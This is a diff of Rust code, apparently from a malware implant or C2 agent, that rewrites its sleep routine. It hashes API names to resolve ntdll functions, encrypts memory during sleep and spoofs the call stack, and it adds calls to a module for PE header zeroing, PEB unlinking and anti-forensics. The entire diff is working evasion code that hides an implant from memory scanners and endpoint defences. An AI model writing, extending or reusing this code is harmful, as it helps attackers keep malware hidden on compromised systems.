@@ -64,96 +64,43 @@ pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
 pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Result<()> {
     match &config.method {
         SleepMethod::Ekko | SleepMethod::Foliage => {
-            info!("Initiating Foliage-style sleep for {:?}", duration);
+            // Delegate to the advanced sleep_obfuscation module which provides
+            // full memory encryption (XChaCha20-Poly1305), stack spoofing,
+            // PE header zeroing, and PEB unlinking — superseding the legacy
+            // Ekko/Foliage path.
             #[cfg(target_arch = "x86_64")]
-            unsafe {
-                // Foliage uses NtDelayExecution
-
+            {
+                info!(
+                    "Initiating advanced sleep obfuscation for {:?}",
+                    duration
+                );
+                let mut soc = crate::sleep_obfuscation::SleepObfuscationConfig::default();
+                soc.sleep_duration_ms = duration.as_millis() as u64;
+                soc.encrypt_stack = config.sleep_mask_enabled;
+                soc.encrypt_heap = false;
+                // Key rotation and anti-forensics always active when using
+                // the advanced path.
+                soc.anti_forensics = true;
+                soc.spoof_return_address = true;
+                return crate::sleep_obfuscation::secure_sleep(soc);
+            }
+            #[cfg(not(target_arch = "x86_64"))]
+            {
+                info!("Initiating Foliage-style sleep for {:?}", duration);
                 if config.sleep_mask_enabled {
-                    // Stack-local key: held in this frame, not in any global or
-                    // thread-local, for the duration of the sleep window.
-                    let mut key = [0u8; 32];
-                    rand::thread_rng().fill_bytes(&mut key);
-                    let mut sections = stack_mask::encrypt_with_key(&key);
-
-                    spoof::SLEEP_DURATION_NS.with(|c| c.set(duration.as_nanos() as u64));
-                    let fiber_switched = spoof::spoof_stack();
-                    spoof::SLEEP_DURATION_NS.with(|c| c.set(0));
-
-                    if fiber_switched {
-                        let _ = spoof::restore_stack();
+                    unsafe {
+                        let mut key = [0u8; 32];
+                        rand::thread_rng().fill_bytes(&mut key);
+                        let mut sections = stack_mask::encrypt_with_key(&key);
+                        std::thread::sleep(duration);
                         stack_mask::decrypt_with_key(&mut sections, &key);
                         core::ptr::write_volatile(&mut key, [0u8; 32]);
-                        return Ok(());
                     }
-
-                    let duration_100ns = -(duration.as_nanos() as i64 / 100);
-                    let mut delay = duration_100ns;
-
-                    let ntdll =
-                        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
-                    let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(
-                        ntdll.unwrap_or(0),
-                        pe_resolve::hash_str(b"NtDelayExecution\0"),
-                    )
-                    .unwrap_or(0);
-                    let addr = nt_delay_execution_addr as *const ();
-                    if !addr.is_null() {
-                        let function: extern "system" fn(u8, *mut i64) -> i32 =
-                            std::mem::transmute(addr);
-                        function(0, &mut delay as *mut i64);
-                    } else {
-                        std::thread::sleep(duration);
-                    }
-
-                    stack_mask::decrypt_with_key(&mut sections, &key);
-                    core::ptr::write_volatile(&mut key, [0u8; 32]);
                 } else {
-                    crypto::encrypt_sections();
-                    // Populate SLEEP_DURATION_NS before switching to the sleep fiber
-                    // so the fiber knows how long to sleep (was always 0 before = no-op spoof).
-                    spoof::SLEEP_DURATION_NS.with(|c| c.set(duration.as_nanos() as u64));
-                    let fiber_switched = spoof::spoof_stack();
-                    spoof::SLEEP_DURATION_NS.with(|c| c.set(0));
-
-                    if fiber_switched {
-                        // The sleep fiber already slept for the requested duration.
-                        let _ = spoof::restore_stack();
-                        crypto::decrypt_sections();
-                        return Ok(());
-                    }
-
-                    let duration_100ns = -(duration.as_nanos() as i64 / 100);
-                    let mut delay = duration_100ns;
-
-                    let ntdll =
-                        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
-                    let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(
-                        ntdll.unwrap_or(0),
-                        pe_resolve::hash_str(b"NtDelayExecution\0"),
-                    )
-                    .unwrap_or(0);
-                    let addr = nt_delay_execution_addr as *const ();
-                    if !addr.is_null() {
-                        // Correct NtDelayExecution signature:
-                        //   NTSTATUS NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER Interval)
-                        // BOOLEAN is a 1-byte unsigned integer (u8), NOT i32.
-                        // The previous i32 declaration only worked by x64 calling-
-                        // convention coincidence (H-4).
-                        let function: extern "system" fn(u8, *mut i64) -> i32 =
-                            std::mem::transmute(addr);
-                        function(0, &mut delay as *mut i64);
-                    } else {
-                        // Last-resort fallback if NtDelayExecution cannot be resolved.
-                        std::thread::sleep(duration);
-                    } // close if !addr.is_null()
-
-                    crypto::decrypt_sections();
+                    std::thread::sleep(duration);
                 }
-            } // close unsafe
-            #[cfg(not(target_arch = "x86_64"))]
-            std::thread::sleep(duration);
-            Ok(())
+                return Ok(());
+            }
         }
         _ => {
             if config.sleep_mask_enabled {
